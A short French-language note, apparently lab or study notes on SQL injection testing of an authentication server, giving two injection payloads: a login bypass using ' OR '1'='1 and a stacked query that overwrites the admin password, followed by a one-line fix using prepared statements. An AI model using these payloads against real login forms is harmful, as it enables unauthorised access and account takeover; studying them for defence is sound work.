# Codes du seveur d'authentification
Généré par ChatGPT

# SQLi Testing
## Modifier MDP admin
```
' OR '1'='1`;UPDATE users SET password = 'nouveau_mot_de_passe' WHERE username = 'admin';`

```
## Se connecter sans mot de passe
```
' OR '1'='1
```
## Luter contre ce problème
Utiliser des prepared request/statements pour gérer l'authentification.

